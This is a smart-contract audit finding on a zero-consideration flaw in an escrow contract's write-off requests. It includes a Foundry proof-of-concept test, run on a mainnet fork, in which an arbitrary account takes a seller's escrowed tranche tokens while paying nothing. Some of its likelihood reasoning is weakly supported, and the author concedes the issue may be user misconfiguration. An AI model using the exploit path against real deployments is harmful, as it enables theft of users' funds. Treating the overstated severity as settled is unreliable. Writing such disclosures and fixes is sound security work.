### Title
Zero-consideration write-off requests allow unprivileged theft of escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates that the deposited tranche `amount` is non-zero but places no lower bound on `underlyingsRequested`. A request with `underlyings == 0` (or a cumulative request whose priced leg has not yet been topped up) passes the integrity check in `fullfillWriteOffRequest`, letting any EOA take all escrowed tranche tokens while paying nothing. This is the on-chain analog of "integrity check fails closed": the order-parameter check enforces exact tranche quantity and minimum consideration, but never enforces that the stored order itself is non-trivial, so a malformed/zero-price order is accepted and executed.

### Finding Description
In `contracts/IdleCreditVaultWriteOffEscrow.sol:86-101`, `createWriteOffRequest` reverts only when `amount == 0` (line 90). `underlyingsRequested` may be 0, and the accumulated `userRequests[msg.sender].underlyings` is used verbatim.

In `fullfillWriteOffRequest` (`contracts/IdleCreditVaultWriteOffEscrow.sol:123-155`), the request-matching guard is:

```solidity
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
  revert WrongRequest();
}
```

When `currentRequest.underlyings == 0`, a fulfiller passes `_underlyings = 0`, satisfies the check, transfers 0 underlying, and receives `currentRequest.tranches` via `IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches)` (line 151). The seller receives nothing; the escrowed tranche tokens are stolen.

The vulnerable window is not only "user intentionally sets 0". Because requests accumulate (`currentRequest.tranches + amount`, `currentRequest.underlyings + underlyingsRequested`), a legitimate seller who deposits a second tranche batch before updating the requested underlying amount — or whose `createWriteOffRequest(amount, X)` is not yet mined — exposes a state in which the *entire* escrowed tranche balance is matched by a request whose `underlyings` total is still 0 or below market. Any observer can fulfill at that stale/zero consideration: the check enforces `_underlyings >= stored.underlyings`, not fair value, and the stored value is fully attacker-satisfiable at zero cost.

### Impact Explanation
Direct theft. The fulfiller (any unprivileged EOA — no KYC, no role required, per the docstring "this function can be called by any wallet" at line 122 and the test `testNonKeyringBuyerCanFulfillExistingRequestButCannotWithdraw`) receives escrowed AA/BB tranche tokens redeemable at tranche NAV. Loss equals the seller's full escrowed tranche balance (`currentRequest.tranches`), i.e. up to the seller's entire position in the vault (quantifiable as `tranches * virtualPrice(tranche) / 1e18` underlyings). The seller's "one receipt one payout" invariant and the escrow's fair-exchange invariant are broken: tokens leave escrow with zero consideration.

### Likelihood Explanation
Requires a request with `underlyings == 0` on-chain. This can arise from seller error (mis-set parameter), a top-up sequence where `createWriteOffRequest` is called to add tranches before the requested price is raised, or a victim tricked off-chain into a zero-price request. Once such state exists, fulfillment is atomic, permissionless, and MEV-bot exploitable in the same block it appears — no privileged role, no epoch-phase dependency beyond `isEpochRunning()` for creation. Note that fulfilling is *not* gated by `isEpochRunning`, only creation is.

### Recommendation
- In `createWriteOffRequest`, revert when `underlyingsRequested == 0` (and optionally require `userRequests[msg.sender].underlyings != 0` aggregate) so escrowed tranches can never be matched by a zero-consideration order.
- Optionally bound the exchange rate (e.g., reject requests where `underlyings` exceeds `tranches * virtualPrice / 1e18` by a sanity factor, or allow the seller to set a min-price enforced at fulfill time).
- Alternatively, atomically require the seller to re-specify full order terms at fulfillment, or restrict `fullfillWriteOffRequest` to the borrower.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroConsiderationWriteOffTheft is Test {
  // mainnet fork setup identical to test/foundry/IdleCreditVaultWriteOffEscrow.t.sol
  IdleCDOEpochVariant public constant cdoEpoch =
    IdleCDOEpochVariant(0xf6223C567F21E33e859ED7A045773526E9E3c2D5);
  IdleCreditVaultWriteOffEscrow public escrow;
  IERC20Detailed public underlying;
  IERC20Detailed public tranche;
  address public constant LP = 0xA7780086ab732C110E9E71950B9Fb3cb2ea50D89;
  address public constant TL_MULTISIG = 0xFb3bD022D5DAcF95eE28a6B07825D4Ff9C5b3814;

  function setUp() public {
    vm.createSelectFork('mainnet', 23032567); // epoch running
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    tranche = IERC20Detailed(cdoEpoch.AATranche());
  }

  function testStealEscrowedTranchesWithZeroPayment() external {
    uint256 trancheAmount = tranche.balanceOf(LP);
    assertGt(trancheAmount, 0);

    // 1. Seller escrows all tranche tokens but requests 0 underlyings
    //    (mis-set param, or top-up of tranches before pricing leg is added).
    vm.startPrank(LP);
    tranche.approve(address(escrow), trancheAmount);
    escrow.createWriteOffRequest(trancheAmount, 0);
    vm.stopPrank();

    // 2. Attacker EOA fulfills with _underlyings = 0 -> check passes.
    address attacker = makeAddr("attacker");
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

    // 3. Attacker holds all escrowed tranche tokens, paying nothing.
    assertEq(tranche.balanceOf(attacker), trancheAmount, "attacker stole escrowed tranches");
    assertEq(underlying.balanceOf(LP), 0, "seller received nothing");
    (uint256 t, uint256 u) = escrow.userRequests(LP);
    assertEq(t, 0);
    assertEq(u, 0);
  }
}
```

Note: certainty is limited on whether this is treated as "user misconfiguration" versus a protocol flaw; the contract explicitly allows permissionless fulfillment of whatever is stored, so a zero/stale `underlyings` state is exploitable by any third party regardless of how it arose. I did not fully verify whether an alternative analog (e.g., Keyring `checkCredential` failure modes) is in scope, but `isWalletAllowed` fails closed correctly (`IdleCDOEpochVariant.sol:984-987`).
